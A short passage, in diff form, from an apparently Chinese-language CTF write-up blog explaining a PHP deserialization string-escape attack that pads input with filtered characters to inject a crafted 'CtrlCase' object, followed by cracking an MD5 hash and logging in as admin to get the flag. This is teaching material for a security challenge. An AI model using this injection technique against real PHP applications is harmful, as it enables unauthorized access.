+所以。我们直接自己构造。&quot;闭合前面<br>
+<code>;s:8:&quot;CtrlCase&quot;;</code>表示CtrlCase开始后面跟我们构造的object对象<br>
+最后还得加上<code>}</code>表示整个序列化字符串结尾。<br>
+总共222个字符。根据替换。*替换hacker。一次可以多5个字符。union替换。一次多1个字符。<br>
+<code>*x44+unionx2=222</code><br>
+<img src="https://guokeya.github.io/post-images/1582640275345.png" alt="" loading="lazy"><br>
+将这串md5解密。得到yingyingying<br>
+admin，yingyingying登陆拿flag<br>
+<img src="https://guokeya.github.io/post-images/1582640333234.png" alt="" loading="lazy"></p>
+
             </div>
             
               <div class="tag-container">
